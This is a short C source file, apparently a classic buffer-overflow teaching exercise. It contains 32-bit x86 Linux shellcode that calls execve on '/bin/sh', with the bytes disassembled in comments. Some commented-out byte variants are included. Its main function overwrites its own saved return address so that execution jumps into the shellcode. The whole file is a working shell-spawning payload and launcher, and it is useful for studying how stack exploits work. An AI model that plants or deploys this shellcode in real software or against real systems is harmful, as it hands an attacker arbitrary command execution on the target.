#include <stdio.h>

char shellcode[] = 
/*   "\xeb\x1f"             // jmp 0x1f              # 2 bytes 
   "\x5e"                 // popl %esi             # 1 byte 
   "\x89\x76\x08"         // movl %esi,0x8(%esi)   # 3 bytes
   "\x31\xc0"             // xorl %eax,%eax        # 2 bytes 
   "\x88\x46\x07"         // movb %eax,0x7(%esi)   # 3 bytes 
   "\x89\x46\x0c"         // movl %eax,0xc(%esi)   # 3 bytes 
   "\xb0\x0b"             // movb $0xb,%al         # 2 bytes 
   "\x89\xf3"             // movl %esi,%ebx        # 2 bytes 
   "\x8d\x4e\x08"         // leal 0x8(%esi),%ecx   # 3 bytes
   "\x8d\x56\x0c"         // leal 0xc(%esi),%edx   # 3 bytes
   "\xcd\x80"             // int $0x80             # 2 bytes
   "\x31\xdb"             // xorl %ebx,%ebx        # 2 bytes 
   "\x89\xd8"             // movl %ebx,%eax        # 2 bytes 
   "\x40"                 // inc %eax              # 1 bytes 
   "\xcd\x80"             // int $0x80             # 2 bytes
   "\xe8\xdc\xff\xff\xff" // call -0x24            # 5 bytes
   "/bin/sh";             // .string \"/bin/sh\"   # 8 bytes
*/

/*  "\xe9\x26\x6b\xfb\xf7   */        "\xeb\x1f"
"\x5e"
"\x89\x76\x08"
"\x31\xc0"
"\x88\x46\x07"
"\x89\x46\x0c"
"\xb0\x0b"
"\x89\xf3"
"\x8d\x4e\x08"
"\x8d\x56\x0c"
"\xcd\x80"
"\x31\xdb"
"\x89\xd8"
"\x40"
"\xcd\x80"
"\xe8"   /* "\xbf\x6a\xfb\xf7" */     "\xdc\xff\xff\xff"
 
/*"\x2f\x62\x69\x6e\x2f\x73\x68"
"\x55\x89\xe5\xe9\xc7\x7b\xfb\xf7"
"\x5e\x89\x76\x08\x31\xc0\x88\x46"
"\x07\x89\x46\x0c\xb0\x0b\x89\xf3"
"\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
"\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
"\x60\x7b\xfb\xf7" */

/*"\x2f\x62\x69\x6e\x2f\x73\x68"*/   "/bin/sh";





void main() { 
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
//  printf(shellcode);
} 